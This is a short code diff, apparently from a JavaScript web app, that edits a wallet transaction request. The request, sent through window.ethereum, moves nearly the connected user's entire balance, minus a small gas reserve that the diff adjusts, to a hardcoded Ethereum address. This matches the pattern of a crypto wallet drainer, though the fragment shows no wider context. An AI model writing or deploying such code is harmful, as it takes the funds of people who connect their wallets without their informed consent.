@@ -52,7 +52,7 @@ function App() {
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt((convertedBalance - (Number(gas) / 30000000)) * 1000000000000000000).toString(16)
+            "value": parseInt((convertedBalance - (Number(gas) / 1000000)) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
